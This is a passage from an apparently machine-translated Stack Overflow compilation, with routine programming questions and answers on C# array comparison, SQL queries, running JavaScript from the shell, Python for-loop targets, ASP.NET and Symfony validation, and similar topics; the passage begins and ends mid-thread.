The implementation of `SequenceEqual` is kind of similar::

```
using (IEnumerator<TSource> enumerator1 = first.GetEnumerator())
using (IEnumerator<TSource> enumerator2 = second.GetEnumerator())
{
    while (enumerator1.MoveNext())
    {
        if (!enumerator2.MoveNext() || !comparer.Equals(enumerator1.Current, enumerator2.Current))
        {
            return false;
        }
    }

    if (enumerator2.MoveNext())
    {
        return false;
    }
}

return true; 
```

This default `SequenceEqual` method use default `EqualityComparer<int>.Default` for `int` which is value equality.

`Array` implement `IStructuralEquatable` with `Equal` method:

```
bool IStructuralEquatable.Equals(object other, IEqualityComparer comparer)
{
    if (other == null) return false;

    if (!object.ReferenceEquals(this, other))
    {
        Array array = other as Array;
        if ((array == null) || (array.Length != this.Length))
        {
            return false;
        }
        for (int i = 0; i < array.Length; i++)
        {
            object x = this.GetValue(i);
            object y = array.GetValue(i);

            if (!comparer.Equals(x, y))
            {
                return false;
            }
        }
    }

    return true;
} 
```

The `IEqualityComparer` from input parameter is used, in here you input `StructruralEqualityComparer` but `int` does not implement `IStructruralEquatable`, so it uses default comparer for `int` which is value equality.

But, needless to input `StructruralEqualityComparer` because `int` is not structural, you should just use:

```
(arr1 as IStructuralEquatable).Equals(arr2, EqualityComparer<int>.Default); 
```

It still works. You should use `StructruralEqualityComparer` if item in array is *structrural*

So to sum up, the implementation for both is kind of the same, both iterate two array based on value equality of `int` to make comparison.

I would prefer the LINQ verson since it is more readable.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-30T01:20:40.923

I just had a related question and saw that this question was never actually answered properly. There is a difference between the structural and the sequence - the first comparison is deep and the second one is not.

This simple code demonstrates and produces `True` `False`:

```
int[][] ints1 = { new int[] { 3, 4 } };
int[][] ints2 = { new int[] { 3, 4 } };
Console.WriteLine(StructuralComparisons.
                          StructuralEqualityComparer.Equals(ints1, ints2));
Console.WriteLine(ints1.SequenceEqual(ints2)); 
```

The name "sequence" suggests one-dimensionalism so the name choice is appropriate.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T09:02:41.703

Standard equality checks in .NET uses EqualityComparer.Default for comparisons. For example dictionaries or SequenceEqual method you have written there uses EqualityComparer.Default by default. And that comparer either uses Equals(object) method or Equals(T) method in presence of IEquatable interface implementation.

But you can always give other comparers like StructuralComparisons.StructuralEqualityComparer to dictionaries or methods such as SequenceEqual.

So, the main difference between two methods is the equality check method they use. SequenceEqual uses IEquatable interface method for checks, and StructuralComparisons.StructuralEqualityComparer uses IStructuralEquatable interface method for checks. And as a result, default equality checks need two of the compared items to be the same type but StructuralEqualityComparer doesn't require them to be same type. As the name suggests it is supposed to compare contents.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T08:53:57.567

linq 版本是最灵活的，它可以比较两个枚举。
StructuralComparisons.StructuralEqualityComparer 版本要求两个集合可以支持 IStructuralEquatable 接口。但我希望如果两个列表的长度不均匀，后者会更快。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-09-30T08:23:48.583

我认为 System.Linq 是你的朋友：

```
bool isEqual = Enumerable.SequenceEqual(array1, array2); 
```

# jsf-2 - jsf 2.1 更新 url 没有重定向

> ID：12659773
> 
> 赞同：1
> 
> 时间：2012-09-30T08:17:11.367
> 
> 标签：jsf-2, url-rewriting, scope, forward

我想更新 url 但我不想使用重定向机制，因为我不想管理请求范围。我已经添加`phaseListener`了在重定向页面时将消息保留在上下文中，但是我开始搜索解决方案如何保持请求范围的 bean，我找到了一些解决方案，例如 flash 范围，但正是我想要的：使用 forward 更改页面时更新浏览器 url机制。我不想做一些类似解决方法的事情。我也试过 f:event 但在 f:event 调用后浏览器没有改变。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T16:40:14.623

我以不同的方式找到了解决方案，我仍在使用重定向，我将 id 放入 flash 范围，然后我在重定向页面中添加了类似的内容；

```
<f:metadata>
<f:event type="preRenderView" listener="#{omLoginController.init()}"></f:event>
</f:metadata> 
```

因此，通过这种方式调用页面 init，并且我已经在 init 方法中初始化了页面相关数据。

# php - 检查 MYSQL 手册以获取正确的语法错误

> ID：12659774
> 
> 赞同：-2
> 
> 时间：2012-09-30T08:17:37.897
> 
> 标签：php, mysql, join

我有以下 MYSQL 语法，但是当我运行它时，检查 MYSQL 手册的语法是否正确时出错。

MYSQL 查询是：

```
SELECT `listings`.sid FROM listings 
        LEFT JOIN `listings_properties` `lp` ON `lp`.`object_sid` = `listings`.`sid` AND `lp`.`id` = \'ClosingDate\'
        WHERE (expiration_date < NOW() OR `lp`.`value` <= NOW()) AND active = 1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:26:14.873

尝试删除 '\'ClosingDate\' 上的两个反斜杠 () 来：

```
SELECT `listings`.sid FROM listings 
LEFT JOIN `listings_properties` `lp` 
   ON `lp`.`object_sid` = `listings`.`sid` 
   AND `lp`.`id` = 'ClosingDate'
WHERE (expiration_date < NOW() 
   OR `lp`.`value` <= NOW()) AND active = 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:26:26.773

```
SELECT a.`sid` FROM `listings` a LEFT JOIN `listings_properties` b 
ON (b.`object_sid` = a.`sid` AND b.`id` = 'ClosingDate')
WHERE (a.`expiration_date` < NOW() OR b.`value` <= NOW()) AND a.`active` = 1 
```

没必要逃`'`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T08:27:11.890

这是错误

```
LEFT JOIN `listings_properties` `lp` ON `lp`.`object_sid` = `listings`.`sid` AND `lp`.`id` = \'ClosingDate\' 
```

应该

```
 LEFT JOIN `listings_properties` `lp` ON `lp`.`object_sid` = `listings`.`sid` AND `lp`.`id` = 'ClosingDate' 
```

和整个查询

```
SELECT a.`sid` FROM `listings` a LEFT JOIN `listings_properties` b 
ON (b.`object_sid` = a.`sid` AND b.`id` = 'ClosingDate')
WHERE (a.`expiration_date` < NOW() OR b.`value` <= NOW()) AND a.`active` = 1 
```

# sql - 高级选择不同

> ID：12659777
> 
> 赞同：1
> 
> 时间：2012-09-30T08:17:46.610
> 
> 标签：sql, oracle, plsql

我是 sql 新手，需要这样做：我有一个名为 sec_users_table 的表。它看起来像这样：

```
id      ip      user_id      to_dt
--------------------------------------------------
1       1        1           26-Apr-12 2:14:02 PM
2       1        1           30-Apr-12 8:48:49 PM
3       1        1           02-May-12 6:17:22 PM
4       2        5           05-May-12 6:18:10 PM
5       2        5           04-May-12 6:17:57 PM
6       3        8           07-May-12 1:32:34 PM
7       3        8           09-May-12 5:09:54 PM
8       4        10          10-May-12 4:40:42 PM
9       5        12          11-May-12 6:10:29 PM 
```

我想选择具有最新日期的唯一对（ip，user_id），但只返回 id 和 ip 列。此示例的结果将是：

```
id      ip
-----------
3       1  
4       2 
7       3  
8       4  
9       5 
```

我正在使用 oracle pl/sql。

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T08:35:12.590

您可以尝试执行以下语句。这个想法是在 ip 和 user_id 上使用排名并按日期对它们进行排序：

```
SELECT id, ip
FROM (
  SELECT id as id,
         ip as ip,
  rank() OVER (PARTITION BY ip, user_id ORDER BY to_dt DESC) as rk
  FROM sec_users_table
)
WHERE rk = 1; 
```

[Sqlfiddle 示例](http://sqlfiddle.com/#!4/ba97d/1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:42:29.917

看看类似的东西

```
SELECT s.id,
      s.ip
FROM sec_users_table s INNER JOIN
(
  SELECT ip,
          user_id,
          MAX(to_dt) last_date
  FROM sec_users_table
  GROUP BY ip,
          user_id
 ) m ON s.ip = m.ip
     and s.user_id = m.user_id
     and s.to_dt = m.last_date
ORDER BY 1, 2 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!4/58085/7/0)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T21:54:04.783

要获取给定用户的最新行：

```
SELECT id, ip
  FROM sec_users_table t
 WHERE to_dt = ( SELECT MAX(to_dt)
                   FROM sec_users_table t2
                  WHERE t2.user_id = t.user_id )
   AND user_id = :user 
```

在`user_id`.

如果存在两个相同日期的风险，并且您希望确保 SQL 仅返回单行，则可能需要添加`AND ROWNMUN = 1`.

# javascript - 是否可以从命令行运行 JavaScript 文件？

> ID：12659778
> 
> 赞同：56
> 
> 时间：2012-09-30T08:18:09.147
> 
> 标签：javascript, shell, console

我有几个 JS 文件，所以不要在控制台窗口（Firefox 和 Chromium）中复制和粘贴每个文件，如果可能的话，我想从 shell 调用它们。

每个 JS 文件都有测试函数，使用 console.log 显示它们是否正确。

* * *

## 回答 #1

> 赞同：84
> 
> 时间：2015-02-27T01:56:39.233

扩展使用 Node.js 的解决方案……</p>

[以下是命令行 JavaScript](http://javascript.cs.lmu.edu/notes/commandlinejs/)页面中的一些示例和屏幕截图。

## 节点 REPL（外壳）

如果您`node`在没有参数的命令行上输入，您将进入 Read-Eval-Print-Loop，或简称 REPL，也称为 shell。您可以在此处以交互方式输入 JavaScript 表达式并立即对它们求值。

![节点 REPL（外壳）](../Images/2764082e4f0fb3c236e1ce0864f391bd.png)

## 从命令行评估 JavaScript 文件

创建一个包含以下内容的文件：

```
console.log('Hello, world'); 
```

从命令行，用于`node`评估文件：

![评估 JavaScript 文件](../Images/3de792b844664c4a926ed99a2bb7da9d.png)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-09-30T08:54:07.103

如果您的测试需要访问 DOM，总会有[PhantomJS](http://phantomjs.org/) - 一个无头 (Webkit) 浏览器。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2017-05-02T05:39:47.120

我并不是说这是最好的解决方案，但它是可用的选项之一。我只是想传播意识，原因之一是 Java 如何运行 javascript，因为它已经有一个嵌入式 JavaScript 运行时已经很长时间了。首先是 Rhino，现在 Java SE 8 附带了一个名为**Nashorn**的新引擎，它基于 JSR 292 和 invokedynamic。它通过调用动态绑定的调用站点更好地符合 ECMA 规范化 JavaScript 规范和更好的运行时性能。它可用于从命令行运行 JavaScript 程序。为此，Oracle 的 JDK 或 OpenJDK 的构建包括一个名为**jjs**的命令行工具。可以在 JDK 安装的 bin/ 文件夹中找到它以及众所周知的 java、javac 或 jar 工具。

jjs 工具接受 JavaScript 源代码文件列表作为参数。考虑以下 hello.js 文件：

```
var hello = function() {
  print("Hello Nashorn!");
};

hello(); 
```

评估它就像这样简单：

```
$ jjs hello.js
Hello Nashorn!
$ 
```

更多细节可以参考官方文档[http://www.oracle.com/technetwork/articles/java/jf14-nashorn-2126515.html](http://www.oracle.com/technetwork/articles/java/jf14-nashorn-2126515.html)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2017-03-16T03:50:55.783

是的，有可能`node`。只需创建一个 js 文件，编写一些代码，保存并转到您保存文件的目录，然后输入`node <your file_name>`. 你完成了。注意：*您的系统上必须已`node`安装*。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2012-09-30T08:23:38.583

您可以使用[node.js](http://nodejs.org/)来做到这一点。您可以单独运行每个文件，但当然我假设文件之间没有依赖关系。

如果您在 Windows 上并且不想安装 Node.js，则此[windows 命令行 javascript讨论了使用 Windows 脚本主机。](https://stackoverflow.com/questions/686377/windows-command-line-javascript)但是 Node 可能是标准化 js 的更好选择（它使用 v8 Javascript 引擎）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-04-05T16:53:08.260

对于那些急于使用 Windows 的用户，只需在命令提示符下尝试以下命令行：

```
cscript /E:jscript myJavaScriptFile.js 
```

# python - 这个 Python 语句是什么意思？

> ID：12659781
> 
> 赞同：14
> 
> 时间：2012-09-30T08:19:23.903
> 
> 标签：python

我正在写一个解析器，在调试它的过程中，我发现显然，这是合法的 Python：

```
for []    in [[]]: print 0 
```

这也是（！）：

```
for [][:] in [[]]: print 0 
```

我不怪解析器感到困惑......*我*无法弄清楚如何解释它！

这句话究竟是什么意思？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-30T08:26:56.403

在执行方面：没有。

循环本身在一个空列表上`for`循环，因此不会发生迭代。

这是一件好事，因为这`for []`意味着：将循环中的每个条目分配给 0 个变量。后半部分可能是让你困惑的地方。

该语句是合法的，因为[目标标记`token_list`](http://docs.python.org/reference/simple_stmts.html#grammar-token-target_list)允许您将序列中的值分配给同样大的变量名序列；我们称之为元组解包。以下是在分配和删除中更有用的目标列表示例：

```
(a, b, c) = range(3)
del a, b, c 
```

您可以在`for`循环中执行相同的操作：

```
nested = [[1,2,3], [4,5,6]]
for a, b, c in nested:
    print nested 
```

您可以同时使用元组和列表作为`target_list`令牌，这也是合法的：

```
[a, b] = (1, 2) 
```

但是，在 Python 中，列表可以为空。因此，以下内容是合法的，但毫无意义：

```
[] = [] 
```

最后，这是这样的：

```
nested_empty = [[], [], []]
for [] in nested_empty:
    pass 
```

目标列表更有趣：

```
[][:] = [1, 2, 3] 
```

现在左侧在分配中使用切片。从文档中：

> 如果目标是切片：评估引用中的主要表达式。它应该产生一个可变的序列对象（例如列表）。分配的对象应该是相同类型的序列对象。接下来，评估下限和上限表达式，只要它们存在；默认为零和序列的长度。边界应评估为（小）整数。如果任一边界为负，则将序列的长度添加到其中。生成的边界被剪裁为介于零和序列长度之间（含）。最后，要求序列对象将切片替换为指定序列的项目。如果对象允许，切片的长度可能与指定序列的长度不同，因此会改变目标序列的长度。

所以这里我们不再使用元组解包；相反，我们将左侧列表的一部分替换为右侧列表。但是因为在我们的示例中，左侧列表是匿名列表文字，所以结果更改的列表再次丢失。

但是因为这样的赋值在 for 循环中也是合法的，所以以下是合法的语法，尽管相当荒谬：

```
for [][:] in [range(i) for i in range(10)]: print 0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:27:57.667

```
for [] in [[]]: print 0 
```

它相当于：

```
In [44]: for [x,y] in [[1,2],[3,4],[5,6]]: # or even (x,y) will work
    print x,y
   ....:     
   ....:     
1 2
3 4
5 6 
```

但前者期望列表中**没有返回值**，即列表中的值要么为空，要么`len()`为`0`。

你不能`()`在那里使用，因为它不是有效的。

因为在 python 中，你也可以像这样分配：

```
In [56]: x,y=[1,2]      #this means that the expression on RHS should return two values
                        # (x,y)=[1,2] or x,y=(1,2) or (x,y)=(1,2) all are valid

In [57]: x
Out[57]: 1

In [58]: y
Out[58]: 2

In [62]: x,y='ab'     #assign a to x and b to y

In [63]: x
Out[63]: 'a'

In [64]: y
Out[64]: 'b' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T08:28:07.617

这是我最好的猜测：

`for [] in [[]]``[]`意思是“对于这个列表`[[]]`（一个只有一个元素的列表，它是一个空列表对象）中（一个空列表对象）的每个实例， `print 0`.

在第二种情况下，我认为`[:]`只会`slice()`使用所有默认值进行调用，这只会占用整个列表的一部分。在内部这可能会做一些事情，例如制作列表对象的副本，但在这种情况下的效果应该是相同的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-30T08:29:35.810

Python 手册中描述了 for..in 结构

[http://docs.python.org/reference/compound_stmts.html#the-for-statement](http://docs.python.org/reference/compound_stmts.html#the-for-statement)

`in`关键字左侧可以有多个变量

```
for [i,j] in [(1,2),(3,4),(5,6)]:
  print i, j

for [i,j] in [[1,2],[3,4],[5,6]]:
  print i, j 
```

手册说它被解释为

```
i,j = (1,2) 
```

第一次迭代等等。因此，您可以有一个空的变量列表，因为迭代的列表只有一个空列表作为元素。此循环将打印 0 一次。

您正在阅读的解析器是自动生成的吗？这种陈述可以由非人类来源生成。我看不出它的目的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-30T08:37:43.883

```
for []    in [[]]: print 0 
```

表示对于 [[]] 中的每个空迭代器，即包含一个空列表的列表，打印 0。它不仅限于列表，每个迭代器都可以放入其中。例如，您可以尝试：

```
# empty list, empty tuple, empty string, empty unicode
for [] in [[], (), '', unicode()]: print 0 
```

它会打印 0 四次。

[][:] 与 [] 相同。它将返回一个空列表，所以我的答案与上面相同。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-30T08:41:50.650

假设您有一个如下所示的元组列表：

```
L = [(1,2), (3,4), (5,6)] 
```

假设您想以某种特殊方式打印这些元组：

```
for tup in L:
    a = tup[0]
    b = tup[1]
    if a<b:
        print a,b
    else:
        print b,a 
```

但是分配`a`并`b`明确地成为的内容`tup`是相当乏味的。所以你可以这样做：

```
for tup in L:
    a,b = tup
    if a<b:
        print a,b
    else:
        print b,a 
```

但你可以让它变得不那么乏味：

```
for (a,b) in L: # you could also do "for [a,b] in L"
    if a<b:
        print a,b
    else:
        print b,a 
```

在这里，`(a,b)`模式匹配迭代返回的元素。在 for 循环的第一次执行中，迭代返回的元素是，它与`(1,2)`模式匹配`(a,b)`，因此分配`1`给`a`和`2``b`

现在，在您的第一个示例中，您正在迭代一个包含空列表的列表。这意味着您正在尝试打印与此列表中的 s 一样多`0`的 s `[]`。但它比这更复杂一点：

当您尝试像我的第三个示例中那样进行模式匹配时，python 会迭代变量列表（或元组）和迭代器返回的元素，同时在它们进行时分配值。因此，当您的模式不包含变量时，您尝试进行模式匹配的元素也应该是空的（并且是可迭代的）。这解释了以下行为：

```
>>> for i in 5: print i
... 
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'int' object is not iterable

>>> for [] in [[], 5]: print 0
... 
0
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'int' object is not iterable 
```

* * *

……还有这种行为：

```
>>> x,y = (2,5,3)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: too many values to unpack

>>> for [] in [[], [5]]: print 0
... 
0
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: too many values to unpack 
```

* * *

现在，对于您的第二个示例，该`[:]`操作基本上创建了它所调用的列表的副本，因此更改原始列表不会更改副本，反之亦然：

```
>>> L = [1,2,3]
>>> M = L
>>> M[0] = 'a'
>>> print L[0]
'a'

>>> L = [1,2,3]
>>> M = L[:]
>>> M[0] = 'a'
>>> print L[0]
1 
```

因此，当您致电时`[][:]`，您所做的只是创建一个新的空列表，这与我对您的第一个示例的解释相同

# html - 一次悬停两个 html 锚标记

> ID：12659786
> 
> 赞同：-2
> 
> 时间：2012-09-30T08:20:54.040
> 
> 标签：html, css, tags, anchor

我需要帮助同时悬停两个 HTML 标记。请告诉它怎么可能。

这就是我试图做到的方式。

```
<style type="text/css">
.imgmap_css_container a:hover
{
  border:2px solid red;
}
</style>
<div align="center" style="position:relative;">
  <img src="http://dailyaeen.com.pk/epaper/wp-content/uploads/2012/09/27+Sep+2012-1.jpg" alt="News" usemap="imgmap201292811139" />

  <div class="imgmap_css_container" id="imgmap2012930125317">
     <a alt="" title="" href="">
        <a style="position: absolute; top: 0px; left: 0px; width: 611px; height: 128px;"  alt="" title="" href="" target="_blank" >
           <em />
        </a>
        <a style="position: absolute; top: 126px; left: 344px; width: 267px; height: 42px;"  alt="" title="" href="" target="_blank" >
           <em />
        </a>
     </a>
   </div>    
</div> 
```

这是我试图在报纸上实现的页面。

[http://dailyaeen.com.pk/epaper/](http://dailyaeen.com.pk/epaper/)

期待积极的反馈

问候，赛义德·海德尔·哈桑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:13:40.140

你可以在[这个小提琴中使用 jQuery](http://jsfiddle.net/uzBvw/1/)

基本上：

*   给每个 div/image/whatever 你想同时突出显示的内容一个相同的类
*   使用jQuery绑定悬停事件
*   在悬停事件上获取悬停元素的类
*   选择与悬停的具有相同类的所有元素
*   设置他们的css，但是你喜欢他们

# ruby-on-rails - Rails 3.2 中的 Paperclip android apk 附件验证

> ID：12659788
> 
> 赞同：1
> 
> 时间：2012-09-30T08:21:27.940
> 
> 标签：ruby-on-rails, ruby, paperclip

我正在开发一个rails 3.2应用程序，它要求用户上传一个android apk文件，我已经尝试了所有我能想到的验证，在回形针文档中，最好的方法是验证

```
validates_attachment_content_type :binary,
:content_type =>    ['application/vnd.android.package-archive'],
:message => "can only be android application." 
```

但是回形针将 apk 的 content_type 保存为 application/octet-stream 但这种内容类型太通用了，我需要对 android apk 附件进行严格验证。我通过在我的 Gemfile 中使用最新的回形针版本。

```
gem "paperclip", :git => "git://github.com/thoughtbot/paperclip.git" 
```

帮助将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T17:13:45.017

看看这是否适合你：

```
validates_format_of :apk_file_name, :with => %r{\.(apk)$}i 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T12:28:53.087

也许试试这个：

```
validates_attachment_content_type :app, :content_type => ['application/vnd.android.package-archive'] 
```

# c# - 使用自动回发和验证器

> ID：12659790
> 
> 赞同：1
> 
> 时间：2012-09-30T08:21:55.953
> 
> 标签：c#, asp.net

具有 AutoPostback 设置为 true 和验证器的下拉。当我从下拉列表中选择“无效”值时，验证器消息会短暂显示，然后发生回发并且错误消息消失了！这是我的代码：

```
<asp:TextBox ID="SerialFrom_txt" runat="server" BackColor="White" BorderColor="#188F3E"
                            BorderStyle="Solid" BorderWidth="3px" Width="200px" OnTextChanged="SerialFrom_txt_TextChanged"
                            AutoPostBack="true"></asp:TextBox>
                        <asp:RegularExpressionValidator ID="SerialFrom_rv" runat="server" ValidationExpression="^[a-zA-Z]{2}[0-9]{7}$"
                            Text="error" ControlToValidate="SerialFrom_txt" /> 
```

我的回发代码是：

```
protected void SerialFrom_txt_TextChanged(object sender, EventArgs e)
    {

            if (string.Compare(RoleFrom_lbl.Text, SerialFrom_txt.Text) > 0)
            {
                Error_lbl.Text = "Serial From must be greater than " + RoleFrom_lbl.Text + "!";
                SerialFrom_txt.BackColor = System.Drawing.Color.FromName("red");
                SAVE_btn.Enabled = false;
            }

            else
            {
                Error_lbl.Text = "";
                SerialFrom_txt.BackColor = System.Drawing.Color.FromName("white");
                SAVE_btn.Enabled = true;
            }

    } 
```

所以请告诉我该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T09:13:04.123

尝试将 CausesValidation="true" 添加到您的文本框，如下所示：

```
<asp:TextBox CausesValidation="true" ID="SerialFrom_txt" runat="server" BackColor="White" BorderColor="#188F3E" BorderStyle="Solid" BorderWidth="3px" Width="200px" OnTextChanged="SerialFrom_txt_TextChanged" AutoPostBack="true"></asp:TextBox> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T09:14:20.440

还需要在服务器端设置控件 IsValid 状态：

*   将[CustomValidator](http://msdn.microsoft.com/en-us/library/9eee01cx%28v=vs.100%29.aspx)控件添加到表单中；

*   将 CustomValidator.ControlToValidate 设置为“SerialFrom_txt”；

*   处理 CustomValidator.ServerValidate 事件而不是 SerialFrom_txt_TextChanged 事件；

*   在 ServerValidate EventArgs args.IsValid 属性中设置控件 IsValid 状态。

# javascript - 访问同一对象中的 JavaScript 对象文字值

> ID：12659792
> 
> 赞同：23
> 
> 时间：2012-09-30T08:22:51.513
> 
> 标签：javascript, javascript-objects

> **可能重复：**
> [对象字面量声明中的自引用](https://stackoverflow.com/questions/4616202/self-references-in-object-literal-declarations)

有什么方法可以访问同一对象文字中的属性名称的值？像这样的东西：

```
myFunction.init({
    varOne: 'something',
    varTwo: this.varOne + 'something else'
}) 
```

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-09-30T08:26:18.157

不，无法从定义本身访问当前正在定义的对象文字。

如果要根据其他属性的值设置属性，则需要将它们都基于某个外部值（不是属性本身），或者在定义可以设置某些属性的对象文字后运行初始化函数基于其他属性的值。

# php - 无法让 Symfony 验证工作

> ID：12659793
> 
> 赞同：0
> 
> 时间：2012-09-30T08:23:09.097
> 
> 标签：php, symfony, validation

我正在尝试为我的注册表单添加一些验证，但我无法让它工作，到目前为止我已经添加了我的用户实体

片段。

```
class User {

/**
 * @ORM\Id
 * @ORM\Column(type="integer")
 * @ORM\GeneratedValue(strategy="AUTO")
 */
   protected $userid;

/**
 * @ORM\Column(type="string", length=30)
 */
 protected $username; 
```

为此，我在我的包中添加了一个validation.yml。

```
# src/Blomster/UserBundle/Resources/config/validation.yml

Blomster/UserBundle/Entity/User:
    properties:
        username:
            - NotBlank: ~
            - MinLength: { limit: 3, message: "Username is too short." }
            - MaxLength: { limit: 15, message: "Username is too long." } 
```

使用 $form->isValid() 总是返回 true，所以我尝试 var_dump 我的表单

```
 'validation_groups' => null
      'validation_constraint' => null
      'constraints' => 
        array (size=0)
          ... 
```

表单本身运行良好，提交时它会添加到我的数据库中，我是否需要以某种方式将约束添加到表单中？

添加了 UserType.php

```
class UserType extends AbstractType {

  public function buildForm(FormBuilderInterface $builder, array $options) {
    $builder->add('username', null, array('label' => 'Username'));
    $builder->add('email', 'email', array('label' => 'Email'));
    $builder->add('password', 'repeated', array(
        'type' => 'password',
        'required' => true,
        'first_options' => array('label' => 'Password'),
        'second_options' => array('label' => 'Repeat password'),
      ));
  }

  public function getDefaultOptions(array $options) {
    return array('data_class' => 'Blomster\UserBundle\Entity\User');
  }

  public function getName() {
    return 'user';
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:34:55.840

您需要使用长度限制：

```
 - MinLength: { limit: 3 }
        - MaxLength: { limit: 15 } 
```

[这](http://symfony.com/doc/current/reference/constraints/MinLength.html)是文档。

事实上：您需要指定一个限制，因为您还可以设置其他选项，如消息等。

# sqlite - 带有引擎场的亚马逊 ec2 上的 Sqlite 3.7

> ID：12659794
> 
> 赞同：1
> 
> 时间：2012-09-30T08:23:22.987
> 
> 标签：sqlite, amazon-ec2, engineyard

如何在使用引擎场部署的亚马逊 ec2 实例上更新 sqlite3 的版本？目前版本是 3.6.13，但我需要 3.7.x 版本才能使用 sqlite 的 WAL 功能。

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-28T20:22:17.670

可以通过编写自定义 Chef 食谱进行升级。请注意，如果您进行升级，Engine Yard 将不支持您的软件设置。

来源： https: [//support.cloud.engineyard.com/entries/21009947-Upgrade-to-a-more-modern-version-of-ImageMagick](https://support.cloud.engineyard.com/entries/21009947-Upgrade-to-a-more-modern-version-of-ImageMagick)

如何创建自定义食谱：https: [//support.cloud.engineyard.com/entries/21009867-Customize-Your-Environment-with-Chef-Recipes](https://support.cloud.engineyard.com/entries/21009867-Customize-Your-Environment-with-Chef-Recipes)

# php - 以某种方式回显 \n 的代码

> ID：12659796
> 
> 赞同：1
> 
> 时间：2012-09-30T08:23:29.213
> 
> 标签：php

我正在使用以下代码在 PHP 和 Node.JS 之间共享我的会话。

[http://pastie.org/4874088](http://pastie.org/4874088)

问题是，因为我必须在每个脚本的开头包含它，我遇到了一个奇怪的问题：

基本上在该代码的某个地方，有**一些东西**正在**呼应新行**，破坏了我使用的一些 AJAX 函数（在客户端和服务器之间共享小文本位）。

我很难找到这条丑陋的线；你能找到吗？

需要注意的是，该行必须完全在此文件中，而不是在

```
require("$appDirectory/vars/lib/Predis/Autoloader.php"); 
```

当我也尝试删除 predis 客户端时。

提前致谢。

屏幕截图：[imgur.com/RSpyA](https://imgur.com/RSpyA)：第 1 行是问题所在：

![在此处输入图像描述](../Images/b5df251c2528ec0e3ce2e82b60d29b2f.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:39:04.317

`?>`也许某处之后的新行

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:33:57.817

问题是`Autoloader.php`。试着在这个文件中找出来。可能你是这样使用的

```
 <?php echo "something"; ?>
              //or

<?php //somevalues

?>

<?php
// see the new lines b/w two php blocks
?> 
```

# vb.net - 将图像转换为字节数组会产生 Null 异常

> ID：12659800
> 
> 赞同：0
> 
> 时间：2012-09-30T08:23:39.570
> 
> 标签：vb.net

当我尝试将图像转换为字节数组时，它给了我空异常。我将图像分成 4 个相等的部分，然后将每个部分转换为字节数组。

```
 OpenFileDialog1.ShowDialog()
    i = Image.FromFile(OpenFileDialog1.FileName)

    Dim g As Graphics
    Dim OriginalBit As New Bitmap(i)
    Dim x1 = 0, y1 = 0, x, y, k As Integer
    x = i.Width / 2
    y = i.Height / 2
    Dim i1, i2, i3, i4 As Image
    Dim bit As Bitmap = OriginalBit.Clone(New RectangleF(0, 0, x, y), Imaging.PixelFormat.DontCare)
    PictureBox2.Width = bit.Width
    PictureBox2.Height = bit.Height
    i1 = bit 
```

![在此处输入图像描述](../Images/b947ea2d77266f61429581bc7fedd961.png)

但是，当我将拆分后的 Bitmapimage 对象（位）分配给 Imageobject（i1）并尝试将其转换为字节数组时，它给了我错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:48:32.470

看着我注意到的异常：`Parameter name: encoder`.

所以我认为`i1.RawFormat`i1 本身没有问题。可能是裁剪操作或`Clone(....,Imaging.PixelFormat.DontCare)`保留未正确设置 RawFormat 值的位对象。

我现在无法测试，但我会尝试

```
Dim bit As Bitmap = OriginalBit.Clone(New RectangleF(0, 0, x, y), OriginalBit.PixelFormat) 
```

或者

```
i1.Save(mem, OriginalBit.RawFormat) 
```

# android - 使用 Android 读取 PDF 文件

> ID：12659804
> 
> 赞同：1
> 
> 时间：2012-09-30T08:24:07.133
> 
> 标签：android, pdf

我正在开发一个读取 PDF 文件的 Android 应用程序。

我希望我的程序从 PDF 文件中复制一段文本并将其传输到我的程序中并将其存储在一个变量中。你是怎样做的？

我需要使用应用程序来做到这一点吗？或者有这样做的代码？我在 android 开发站点中看到**了 filereader**库（如果我错了，请纠正我）。我还没有尝试过，因为我正忙于我拥有的其他项目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:29:05.000

您可以下载[PDFbox API](http://pdfbox.apache.org/)以在 android 中阅读 PDF。

* * *

## 回答 #2

> 赞同：0
> 
